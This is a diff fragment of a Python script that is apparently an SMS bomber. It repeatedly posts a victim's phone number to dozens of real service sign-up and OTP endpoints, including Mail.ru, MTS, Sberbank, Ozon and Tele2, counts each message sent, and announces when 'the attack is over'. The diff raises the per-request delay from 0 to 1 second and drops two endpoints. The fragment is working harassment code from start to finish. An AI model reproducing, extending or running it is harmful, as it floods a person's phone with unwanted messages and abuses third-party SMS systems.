                           json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email", })
             R = R + 1
             print('[+] Mail.ru Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4610,7 +4474,7 @@ if call == str(2):
                           json={"phone": (_phone, "+* (***) ***-**-**"), "type": "register", })
             R = R + 1
             print('[+] Creditter Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4626,7 +4490,7 @@ if call == str(2):
                                 "SecondName": _name, "Phone": _phone, "Email": _email, })
             R = R + 1
             print('[+] Ingos Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4639,7 +4503,7 @@ if call == str(2):
                                 "email": "", "lang": "en", })
             R = R + 1
             print('[+] Admiralxxx Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4650,7 +4514,7 @@ if call == str(2):
             requests.post('https://oauth.av.ru/check-phone', json={"phone": (_phone, "+* (***) ***-**-**")})
             R = R + 1
             print('[+] Av Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4662,7 +4526,7 @@ if call == str(2):
                           params={"msisdn": _phone})
             R = R + 1
             print('[+] MTS Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4673,7 +4537,7 @@ if call == str(2):
             requests.post('https://city24.ua/personalaccount/account/registration', data={"PhoneNumber": _phone})
             R = R + 1
             print('[+] City24 Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4684,7 +4548,7 @@ if call == str(2):
             requests.post('https://client-api.sushi-master.ru/api/v1/auth/init', json={"phone": _phone})
             R = R + 1
             print('[+] SushiMaster Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4695,7 +4559,7 @@ if call == str(2):
             requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
             R = R + 1
             print('[+] MultiPlex Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4706,7 +4570,7 @@ if call == str(2):
             requests.post('https://3040.com.ua/taxi-ordering', data={"callback-phone": _phone})
             R = R + 1
             print('[+] 3040 Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4718,7 +4582,7 @@ if call == str(2):
                           data={"REGISTER[PERSONAL_PHONE]": _phone, "code": "", "sendsms": "Выслать код", })
             R = R + 1
             print('[+] Niyama Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4729,7 +4593,7 @@ if call == str(2):
             requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={"phone": _phone})
             R = R + 1
             print('[+] VSK Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4740,7 +4604,7 @@ if call == str(2):
             requests.post('https://api.easypay.ua/api/auth/register', json={"phone": _phone, "password": _password})
             R = R + 1
             print('[+] EasyPay Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4752,7 +4616,7 @@ if call == str(2):
                           data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone})
             R = R + 1
             print('[+] Fix-Price Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
 
@@ -4764,7 +4628,7 @@ if call == str(2):
             requests.post('https://msk.tele2.ru/api/validation/number/' + _phone, json={"sender": "Tele2"})
             R = R + 1
             print('[+] Tele2 Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4775,7 +4639,7 @@ if call == str(2):
             requests.get('https://www.finam.ru/api/smslocker/sendcode', data={"phone": "+" + _phone})
             R = R + 1
             print('[+] Finam Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4787,7 +4651,7 @@ if call == str(2):
                           params={"cb_fio": _name, "cb_phone": format(_phone, "+* *** *** ** **")})
             R = R + 1
             print('[+] MakiMaki Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4801,7 +4665,7 @@ if call == str(2):
                           json={"loginId": "+" + _phone, "supportAllStates": True})
             R = R + 1
             print('[+] FlipKart Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4812,7 +4676,7 @@ if call == str(2):
             requests.post('https://secure.online.ua/ajax/check_phone/', params={"reg_phone": _phone})
             R = R + 1
             print('[+] Online.ua Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4823,7 +4687,7 @@ if call == str(2):
             requests.post('https://cabinet.planetakino.ua/service/sms', params={"phone": _phone})
             R = R + 1
             print('[+] PlanetaKino Was sent!')
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4835,7 +4699,7 @@ if call == str(2):
                           json={"country": _codes[_code].upper(), "phone": _phone, })
             R = R + 1
             print('[+] OnTaxi Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4846,7 +4710,7 @@ if call == str(2):
             requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
             R = R + 1
             print('[+] Iqos Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4858,7 +4722,7 @@ if call == str(2):
                           json={"mobile": "+" + _phone, "action": "confirm_mobile"})
             R = R + 1
             print('[+] Smart.Space Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
 
@@ -4872,7 +4736,7 @@ if call == str(2):
                                 'phone': _phone})
             R = R + 1
             print('[+] tarantino-family Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4888,7 +4752,7 @@ if call == str(2):
                                 "utc_offset": "120", })
             R = R + 1
             print('[+] Apteka Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4900,7 +4764,7 @@ if call == str(2):
                           headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": _phone})
             R = R + 1
             print('[+] Uklon Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4912,7 +4776,7 @@ if call == str(2):
                           json={"phone": _phone, "otpId": 0})
             R = R + 1
             print('[+] Ozon Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4925,7 +4789,7 @@ if call == str(2):
                                  "gorod": "Москва", "approving_data": "1", })
             R = R + 1
             print('[+] Banki Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4936,7 +4800,7 @@ if call == str(2):
             requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
             R = R + 1
             print('[+] IVI Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4948,7 +4812,7 @@ if call == str(2):
                           data={"firstname": _name, "phone": _phone, "email": _email})
             R = R + 1
             print('[+] Moyo Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4959,7 +4823,7 @@ if call == str(2):
             requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})
             R = R + 1
             print('[+] Helsi Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4971,7 +4835,7 @@ if call == str(2):
                           json={"Phone": _phone, "Type": 1})
             R = R + 1
             print('[+] KinoLend Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4984,7 +4848,7 @@ if call == str(2):
                                 '_token': '*'})
             R = R + 1
             print('[+] PizzaHut Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4996,7 +4860,7 @@ if call == str(2):
             requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
             R = R + 1
             print('[+] Rabota Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5007,7 +4871,7 @@ if call == str(2):
             requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
             R = R + 1
             print('[+] Rutube Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Rutube in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5018,7 +4882,7 @@ if call == str(2):
             requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
             R = R + 1
             print('[+] Citilink Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5030,7 +4894,7 @@ if call == str(2):
                           data={'name': _name, 'phone': _phone, 'promo': 'yellowforma'})
             R = R + 1
             print('[+] Smsint Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5042,7 +4906,7 @@ if call == str(2):
                 'https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9 + '&country_code=%2B7&nod=4&locale=en')
             R = R + 1
             print('[+] oyorooms Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5055,7 +4919,7 @@ if call == str(2):
                           data={"phone": _phone, "recaptcha": "off", "g-recaptcha-response": "", })
             R = R + 1
             print('[+] MVIDEO Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5068,7 +4932,7 @@ if call == str(2):
                                                               'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
             R = R + 1
             print('[+] newnext Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5079,7 +4943,7 @@ if call == str(2):
             requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
             R = R + 1
             print('[+] Sunlight Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5092,7 +4956,7 @@ if call == str(2):
                                 'deliveryOption': 'sms'})
             R = R + 1
             print('[+] alpari Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5103,7 +4967,7 @@ if call == str(2):
             requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
             R = R + 1
             print('[+] Invitro Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5116,7 +4980,7 @@ if call == str(2):
                                 'params': {'phone': _phone}, 'id': '1'})
             R = R + 1
             print('[+] Sberbank Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
 
@@ -5129,7 +4993,7 @@ if call == str(2):
                           params={"msisdn": _phone})
             R = R + 1
             print('[+] MTS Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5141,7 +5005,7 @@ if call == str(2):
                           data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
             R = R + 1
             print('[+] Delitime Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5153,7 +5017,7 @@ if call == str(2):
                           json={"phone": {"code": 1, "number": _phone}})
             R = R + 1
             print('[+] Guru Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5166,7 +5030,7 @@ if call == str(2):
                                 "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
             R = R + 1
             print('[+] ICQ Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5179,7 +5043,7 @@ if call == str(2):
                                 "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
             R = R + 1
             print('[+] InDriver Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5191,7 +5055,7 @@ if call == str(2):
                           data={"password": password, "application": "lkp", "login": "+" + _phone})
             R = R + 1
             print('[+] Invitro Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5202,7 +5066,7 @@ if call == str(2):
             requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
             R = R + 1
             print('[+] Pmsm Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5213,7 +5077,7 @@ if call == str(2):
             requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
             R = R + 1
             print('[+] IVI Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5224,7 +5088,7 @@ if call == str(2):
             requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
             R = R + 1
             print('[+] Lenta Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5236,7 +5100,7 @@ if call == str(2):
                           json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email"})
             R = R + 1
             print('[+] Mail.ru Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5249,7 +5113,7 @@ if call == str(2):
                           data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
             R = R + 1
             print('[+] MVideo Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5261,33 +5125,10 @@ if call == str(2):
                           data={"st.r.phone": "+" + _phone})
             R = R + 1
             print('[+] OK Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
-            R = R + 1
-            print('[+] qlean Was sent! || Count - ' + str(R))
-            time.sleep(0)
-        except:
-            print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://sso.cloud.qlean.ru/http/users/requestotp',
-                          headers={"Referer": "https://qlean.ru/sso?redirectUrl=https://qlean.ru/"},
-                          params={"phone": _phone, "clientId": "undefined", "sessionId": str(randint(5000, 9999))})
-            R = R + 1
-            print('[+] Qlean Was sent! || Count - ' + str(R))
-            time.sleep(0)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -5296,7 +5137,7 @@ if call == str(2):
             requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
             R = R + 1
             print('[+] SMSgorod Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5321,7 +5162,7 @@ if call == str(2):
                                 "password": password, "phone_number": _phone, "username": username})
             R = R + 1
             print('[+] Twitch Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5333,7 +5174,7 @@ if call == str(2):
                           headers={'App-ID': 'cabinet'})
             R = R + 1
             print('[+] CabWiFi Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5344,7 +5185,7 @@ if call == str(2):
             requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
             R = R + 1
             print('[+] wowworks Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5356,7 +5197,7 @@ if call == str(2):
                           json={"phone_number": "+" + _phone})
             R = R + 1
             print('[+] Eda.Yandex Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5367,7 +5208,7 @@ if call == str(2):
             requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
             R = R + 1
             print('[+] Youla Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5380,7 +5221,7 @@ if call == str(2):
                                 "deliveryOption": "sms"})
             R = R + 1
             print('[+] Alpari Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5391,7 +5232,7 @@ if call == str(2):
             requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
             R = R + 1
             print('[+] SMS Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5402,7 +5243,7 @@ if call == str(2):
             requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
             R = R + 1
             print('[+] Delivery Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5415,14 +5256,14 @@ if call == str(2):
                                  "gorod": "Москва", "approving_data": "1", })
             R = R + 1
             print('[+] Banki Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         try:
             requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
             R = R + 1
             print('[+] IVI Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5434,7 +5275,7 @@ if call == str(2):
                           data={"firstname": _name, "phone": _phone, "email": _email})
             R = R + 1
             print('[+] Moyo Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5445,7 +5286,7 @@ if call == str(2):
             requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})
             R = R + 1
             print('[+] Helsi Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5457,7 +5298,7 @@ if call == str(2):
                           json={"Phone": _phone, "Type": 1})
             R = R + 1
             print('[+] KinoLend Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5470,7 +5311,7 @@ if call == str(2):
                                 '_token': '*'})
             R = R + 1
             print('[+] PizzaHut Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5481,7 +5322,7 @@ if call == str(2):
             requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
             R = R + 1
             print('[+] Rabota Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5492,7 +5333,7 @@ if call == str(2):
             requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
             R = R + 1
             print('[+] Rutube Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Rutube in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5503,7 +5344,7 @@ if call == str(2):
             requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
             R = R + 1
             print('[+] Citilink Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5515,7 +5356,7 @@ if call == str(2):
                           data={'name': _name, 'phone': _phone, 'promo': 'yellowforma'})
             R = R + 1
             print('[+] Smsint Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5527,7 +5368,7 @@ if call == str(2):
                 'https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9 + '&country_code=%2B7&nod=4&locale=en')
             R = R + 1
             print('[+] oyorooms Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5540,7 +5381,7 @@ if call == str(2):
                           data={"phone": _phone, "recaptcha": "off", "g-recaptcha-response": "", })
             R = R + 1
             print('[+] MVIDEO Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5553,7 +5394,7 @@ if call == str(2):
                                                               'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
             R = R + 1
             print('[+] newnext Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5564,7 +5405,7 @@ if call == str(2):
             requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
             R = R + 1
             print('[+] Sunlight Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5577,7 +5418,7 @@ if call == str(2):
                                 'deliveryOption': 'sms'})
             R = R + 1
             print('[+] alpari Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5588,7 +5429,7 @@ if call == str(2):
             requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
             R = R + 1
             print('[+] Invitro Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5601,7 +5442,7 @@ if call == str(2):
                                 'params': {'phone': _phone}, 'id': '1'})
             R = R + 1
             print('[+] Sberbank Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
 
@@ -5614,7 +5455,7 @@ if call == str(2):
                           params={"msisdn": _phone})
             R = R + 1
             print('[+] MTS Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5626,7 +5467,7 @@ if call == str(2):
                           data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
             R = R + 1
             print('[+] Delitime Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5642,7 +5483,7 @@ if call == str(2):
                           json={"phone": {"code": 1, "number": _phone}})
             R = R + 1
             print('[+] Guru Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5655,7 +5496,7 @@ if call == str(2):
                                 "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
             R = R + 1
             print('[+] ICQ Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5668,7 +5509,7 @@ if call == str(2):
                                 "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
             R = R + 1
             print('[+] InDriver Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5680,7 +5521,7 @@ if call == str(2):
                           data={"password": password, "application": "lkp", "login": "+" + _phone})
             R = R + 1
             print('[+] Invitro Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5691,7 +5532,7 @@ if call == str(2):
             requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
             R = R + 1
             print('[+] Pmsm Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5702,7 +5543,7 @@ if call == str(2):
             requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
             R = R + 1
             print('[+] IVI Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5713,7 +5554,7 @@ if call == str(2):
             requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
             R = R + 1
             print('[+] Lenta Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5725,7 +5566,7 @@ if call == str(2):
